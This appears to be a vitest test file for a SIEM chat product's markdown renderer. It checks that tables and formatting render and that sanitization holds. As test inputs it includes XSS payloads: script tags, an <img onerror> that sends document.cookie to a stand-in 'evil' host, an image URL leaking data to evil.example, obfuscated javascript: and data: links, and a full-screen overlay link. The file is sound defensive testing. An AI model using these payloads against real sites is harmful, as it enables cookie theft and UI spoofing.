/**
 * Sanitizer-contract tests for the chat markdown renderer (#98).
 *
 * The invariant that must never regress: model-generated markdown embeds
 * tenant SIEM data, so rendered HTML must be GFM-formatted AND safe (no
 * script, no <img> exfil channel, no javascript: links, no attacker CSS),
 * while literal hostile log content stays VISIBLE (escaped, not vanished).
 *
 * jsdom environment (DOMPurify needs a DOM); configured in vite.config.ts.
 */
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

describe('renderMarkdown — formatting', () => {
	it('renders a GFM pipe table as a real <table>', () => {
		const md = [
			'| Tenant | Slug | Open | Max Severity |',
			'|---|---|---|---|',
			'| **Northwind Labs** | `northwind` | 8 | **13** |',
			'| **Demo Tenant** | `demo` | 124 | 12 |'
		].join('\n');
		const html = renderMarkdown(md);
		expect(html).toContain('<table');
		expect(html).toContain('<th');
		expect(html).toContain('<td');
		expect(html).toContain('<strong>Northwind Labs</strong>');
		expect(html).toContain('<code>northwind</code>');
		expect(html).not.toContain('|---|');
	});

	it('formats bold, headings, lists, blockquotes, code', () => {
		const html = renderMarkdown('## Title\n\n- one\n- two\n\n> note\n\n**strong**\n\n```sql\nSELECT 1;\n```');
		expect(html).toContain('<h2');
		expect(html).toContain('<ul');
		expect(html).toMatch(/<li>one<\/li>/);
		expect(html).toContain('<blockquote');
		expect(html).toContain('<strong>strong</strong>');
		expect(html).toContain('<pre');
		expect(html).toContain('SELECT 1;');
	});
});

describe('renderMarkdown — security', () => {
	it('strips <script> from the markdown source', () => {
		const html = renderMarkdown('hello <script>alert(1)</script> world');
		expect(html).not.toContain('<script');
		expect(html).not.toContain('alert(1)</script>');
	});

	it('shows a literal <script> log line as VISIBLE escaped text, not vanished', () => {
		// A SIEM evidence string must remain readable, not be silently removed.
		const html = renderMarkdown('Suspicious payload in log: <script>steal()</script>');
		expect(html).not.toContain('<script'); // no live tag
		expect(html).toContain('&lt;script&gt;'); // but the analyst still sees it
		expect(html).toContain('steal()');
	});

	it('never emits a live <img> (zero-click exfil channel), markdown or raw', () => {
		// Markdown image: no live tag at all.
		expect(renderMarkdown('![x](https://evil.example/leak?d=secret)')).not.toMatch(/<img\b/);
		// Raw <img onerror>: escaped to visible text, so no live tag and no live
		// handler can fire — the payload is shown, not executed.
		const raw = renderMarkdown('<img src=x onerror="fetch(`//evil/`+document.cookie)">');
		expect(raw).not.toMatch(/<img\b/);
		expect(raw).not.toMatch(/onerror=(?!&quot;)/); // no live (unescaped) handler
		expect(raw).toContain('&lt;img'); // visible as text
	});

	it('escapes raw HTML so attacker CSS classes can never land on real elements', () => {
		// UI-spoofing overlay attempt: a full-screen positioned <a>.
		const html = renderMarkdown('<a class="fixed inset-0 z-50 bg-black" href="https://evil">click</a>');
		expect(html).not.toMatch(/<a\b[^>]*class=/i); // no class on a real anchor
		expect(html).not.toMatch(/<a\b[^>]*href="https:\/\/evil/i); // not a live link
		expect(html).toContain('&lt;a class='); // escaped to visible text instead
	});

	it('neutralizes javascript:/data: links across case and whitespace', () => {
		for (const href of ['javascript:alert(1)', 'JavaScript:alert(1)', 'java\tscript:alert(1)', 'data:text/html,<b>x']) {
			const html = renderMarkdown(`[click](${href})`);
			expect(html.toLowerCase()).not.toContain('javascript:');
			expect(html.toLowerCase()).not.toContain('data:text/html');
		}
	});

	it('keeps http/https/mailto links with the forced link policy', () => {
		const ok = renderMarkdown('[docs](https://soctalk.ai) and [mail](mailto:a@b.com)');
		expect(ok).toContain('href="https://soctalk.ai"');
		expect(ok).toContain('href="mailto:a@b.com"');
		expect(ok).toContain('rel="noopener noreferrer"');
		expect(ok).toContain('target="_blank"');
	});

	it('drops non-allowlisted url schemes (tel) into plain text', () => {
		const html = renderMarkdown('[call](tel:+15551234)');
		expect(html).not.toContain('href="tel:');
	});

	it('neutralizes obfuscated and autolinked script/data schemes', () => {
		const cases = [
			'<javascript:alert(1)>', // GFM autolink form
			'[x](java&#9;script:alert(1))', // entity-encoded tab in scheme
			'[x](  javascript:alert(1))', // leading whitespace
			'[x](JAVASCRIPT:alert(1))', // uppercase
			'[x](data:text/html,<b>x</b>)'
		];
		for (const md of cases) {
			const html = renderMarkdown(md).toLowerCase();
			expect(html, md).not.toMatch(/href="[^"]*javascript:/);
			expect(html, md).not.toMatch(/href="[^"]*data:text\/html/);
		}
	});

	it('protocol-relative links never carry a script/data scheme', () => {
		// `//host` is treated like any external link (allowed, noopener); the
		// security property is only that it can never be a js/data href.
		const html = renderMarkdown('[x](//evil.example/p)');
		expect(html).not.toMatch(/href="[^"]*(?:javascript|data):/i);
	});

	it('produces no unsafe DOM on partial/streamed markdown', () => {
		expect(renderMarkdown('here is a table\n\n| a | b |\n|---|')).not.toContain('<script');
		// An unclosed fence renders as a code block through EOF (safe once sanitized).
		expect(renderMarkdown('```js\nconst x = 1')).not.toContain('<script');
		expect(renderMarkdown('[half link](https://exa')).not.toContain('<script');
	});
});
